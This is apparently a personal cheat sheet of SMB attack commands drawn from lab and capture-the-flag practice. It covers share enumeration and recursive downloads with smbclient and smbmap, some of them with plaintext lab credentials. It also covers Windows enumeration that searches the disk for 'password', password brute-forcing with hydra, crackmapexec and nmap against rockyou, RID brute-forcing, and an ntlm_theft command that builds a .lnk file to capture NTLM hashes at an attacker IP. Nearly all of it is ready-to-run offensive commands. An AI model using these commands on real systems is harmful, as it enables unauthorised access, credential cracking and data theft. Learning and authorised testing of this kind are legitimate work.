smbmap -u wario -p Mushroom! -d Medtech.com -H 172.16.231.12 -r 
smbclient //172.16.231.12/IPC$ -U medtech\\wario

Connect
smbclient //active.htb/Replication -N

Download files recursively
smbmap -H active.htb -r ShareNameHere --download active.htb

List files recusrively
smbclient //GothMommy.htb/Replication -N -c 'recurse; ls'

Download files recursively
smbclient //GothMommy.htb/Replication -N -c 'recurse; prompt off; mget *'


smbmap -H 

systeminfo 
wmic os get Caption, Version, BuildNumber
net user
net localgroup
net localgroup administrators
ipconfig /all
tasklist
schtasks /query /fo LIST /v
net share
dir C:\ /s /b | findstr /i "password"
wmic product get name,version
echo %USERDOMAIN%
net user /domain
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\" | findstr /i /v """
icacls C:\ /T /C | findstr /i "(F)"

smbclient //192.168.137.248/Users -U relia/jim%Castello1\!

recurse ON
	* dir

If after dirbusting you find a subdomain, run netexec
`netexec smb blazorized.htb`
netexec smb blazorized.htb --shares
`netexec smb --put-file`


hydra -l Neil -P /usr/share/wordlists/rockyou.txt 192.168.112.71 smb
crackmapexec smb 192.168.112.71 -u Neil -p /usr/share/wordlists/rockyou.txt
nmap --script smb-brute -p 445 192.168.112.71 --script-args userdb=users.txt,passdb=/usr/share/wordlists/rockyou.txt

enum4linux -a coffeecorp


smbclient //192.168.244.147/share -N
prompt
recurse ON
mget *
mget .*


crackmapexec smb 192.168.152.172 -u guest -p "" --rid-brute

You can force smb auth and capture ntlm:
https://r4j3sh.medium.com/offsec-vault-proving-grounds-practice-writeup-380915703a09

https://github.com/Greenwolf/ntlm_theft
* You can generate a lnk file which will force ntlm authentication on `Browse to Folder`

python3 ntlm_theft.py -g lnk -s 192.168.45.235 -f vault